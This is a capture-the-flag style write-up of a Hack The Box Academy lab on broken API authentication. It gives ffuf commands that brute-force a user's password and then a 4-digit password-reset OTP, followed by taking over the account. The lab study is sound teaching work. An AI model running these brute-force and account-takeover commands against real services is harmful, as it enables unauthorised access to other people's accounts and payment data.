# Hack The Box Academy - Broken Authentication | Write-up

> **Platform:** Hack The Box Academy &nbsp;•&nbsp; **Category:** API / Web &nbsp;•&nbsp; **Difficulty:** Medium
>
> **Target:** `154.57.164.82:30595` (later `154.57.164.82:32245` after a respawn) &nbsp;•&nbsp; **Time taken:** 35 mins
>
> **Author:** Jithin Jelson

---

## Introduction

In this API Attacks lab we have been told there is a weak password policy that we can utilize to crack passwords and gain access to the email MasonJenkins@ymail.com. We will verify this and use a wordlist and ffuf to brute force our way in.

Credentials given: `htbpentester3@hackthebox.com:HTBPentester3`

---

## Assessment Overview

```mermaid
flowchart LR
    A[Sign in as<br/>pentester3<br/>obtain JWT]:::entry --> B[Recon<br/>current-user<br/>and roles]:::intel
    B --> C[Customers_GetAll<br/>enumerate all<br/>107 customers]:::intel
    B --> D[PATCH current-user<br/>test password policy<br/>weak: 6 char min]:::intel
    D --> E[First attempt<br/>password brute-force<br/>with ffuf]:::payload
    E --> F[Failed<br/>password not<br/>in wordlist]:::mitre
    F --> G[Pivot to OTP<br/>password-reset flow]:::payload
    G --> H[Generate OTP<br/>then brute-force<br/>0000 to 9999]:::mitre
    H --> I[Valid OTP 5887<br/>reset Mason's<br/>password]:::mitre
    I --> J[Log in as Mason<br/>read payment options<br/>flag]:::user

    classDef entry fill:#1d4ed8,stroke:#1e3a8a,color:#ffffff;
    classDef ioc fill:#0f766e,stroke:#134e4a,color:#ffffff;
    classDef intel fill:#7c3aed,stroke:#5b21b6,color:#ffffff;
    classDef mitre fill:#b45309,stroke:#78350f,color:#ffffff;
    classDef payload fill:#be123c,stroke:#881337,color:#ffffff;
    classDef user fill:#15803d,stroke:#14532d,color:#ffffff;
    linkStyle default stroke-width:2px
```

---

## What I Learned

- How to enumerate a customer account through the current-user and roles endpoints to understand what it can do.
- Testing a password policy by abusing the account's own update endpoint, which revealed a weak 6-character minimum.
- Why a password brute-force can be the wrong approach, and how to recognise when to pivot to a different endpoint.
- Abusing an OTP-based password reset that had no rate limiting, so a 4-digit code could be brute-forced in seconds.
- Using ffuf's response matching to pick the single successful attempt out of ten thousand failures.
- That timing matters, because the OTP is only valid for five minutes and must be generated immediately before the brute-force.

---

## Authorising as the Customer

We can start by navigating to our website followed by `/swagger/index.html` and using the credentials in the customer sign-in area. From there we can get our JWT token and then authorise ourselves.

![Customer sign-in with pentester3 credentials](images/01-customer-signin.png)

*Figure 1 - Signing in as htbpentester3 through the customers/sign-in endpoint*

Now we can find our information in the current-user tab.

![customers/current-user response](images/02-current-user.png)

*Figure 2 - Our own customer details returned by customers/current-user*

We can also get information on what roles we have access to.

![roles/current-user response](images/03-roles-current-user.png)

*Figure 3 - Our roles: Customers_UpdateByCurrentUser, Customers_Get, and Customers_GetAll*

We have information on all customers, which is a vulnerability on its own.

![GET all customers response](images/04-all-customers.png)

*Figure 4 - Customers_GetAll returns every customer's details*

---

## Testing the Password Policy

As we have sensitive information, we also have the option to update the current user, which we can use to test the password policy.

```
PATCH /api/v1/customers/current-user
```

We can see if we change our password to a weak value we get a true message, which means the implemented password policy is very weak.

![PATCH current-user password update returns success](images/05-patch-password-policy.png)

*Figure 5 - The update succeeds with a weak password, confirming a weak policy*

Usually to crack passwords we would use rockyou.txt, but the lab has given us the email and password targets to exploit, so we will use that. We can now go back to get our request body to put into ffuf, this is the information we need.

![Sign-in request body](images/06-signin-request-body.png)

*Figure 6 - The sign-in request body we will translate into an ffuf payload*

So we can now translate this into ffuf. The account we have been told to exploit is:

### MasonJenkins@ymail.com

First we can see our error message by generating a wrong password to filter it out with ffuf.

![Invalid Credentials response](images/07-invalid-credentials.png)

*Figure 7 - A wrong password returns the error message "Invalid Credentials"*

---

## First Attempt: Password Brute-Force

Now we have everything for our payload. This is the payload we will use.

```bash
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS \
  -u http://154.57.164.82:30595/api/v1/authentication/customers/sign-in \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email": "MasonJenkins@ymail.com", "Password": "PASS"}' \
  -fr "Invalid Credentials" -t 100
```

However this did not work, and upon further investigation it seems that our attack here isn't finding his password but rather resetting the password using another endpoint, using an OTP brute-force.

![Password reset endpoint in Swagger](images/08-password-reset-endpoint.png)

*Figure 8 - The passwords/resets endpoint, which notes OTPs are valid for only 5 minutes*

---

## Pivot: OTP Brute-Force on the Password Reset

For this we will create a password list from 0 to 9999 to be safe and use this to make our OTP string.

```bash
seq -w 0 9999 > otp-4digit.txt
```

Now we can trigger a password reset to our desired email.

![Generating an OTP for Mason](images/09-generate-otp.png)

*Figure 9 - Triggering an OTP to be sent for MasonJenkins@ymail.com*

Now we trigger an error message to help filter out our ffuf command. Note we changed IP at this stage because our server was hanging.

```bash
curl -X 'POST' 'http://154.57.164.82:32245/api/v1/authentication/customers/passwords/resets' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{"Email": "MasonJenkins@ymail.com", "OTP": "12222", "NewPassword": "string"}' \
  -s -w '\n%{size_download}\n' -o /dev/null
```

![Baseline size check returns 23](images/10-baseline-size.png)

*Figure 10 - A wrong OTP response is 23 bytes*

From this we found out that OTP error strings are 23 bytes, so we can adjust our payload.

```bash
ffuf -w otp-4digit.txt:OTP \
  -u 'http://154.57.164.82:32245/api/v1/authentication/customers/passwords/resets' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"Email": "MasonJenkins@ymail.com", "OTP": "OTP", "NewPassword": "string"}' \
  -fs 23 -t 10
```

![ffuf finds the valid OTP 5887](images/11-ffuf-otp-found.png)

*Figure 11 - ffuf returns OTP 5887 with a 22-byte response, the successful match*

And we got our OTP. Now we can reset the password and log in as the user.

![Password reset succeeds with OTP 5887](images/12-password-reset-success.png)

*Figure 12 - Resetting Mason's password with OTP 5887 returns SuccessStatus true*

And we got our endpoint too. And we get our token.

![Logging in as Mason returns a JWT](images/13-login-as-mason.png)

*Figure 13 - Signing in as MasonJenkins with the new password returns a JWT*

And we get our flag in the payment options screen.

> **What is the flag (Mason's payment options)?**

**Answer:** see note below (payment-options screenshot / flag value not included in the source notes)

---

## Closing Note

This lab was very poorly worded and I could not get it working for a while. It turns out it needed to be executed at the exact time, both the ffuf and the OTP generation, because the OTP is only valid for five minutes. The lab material did not cover OTP at all.
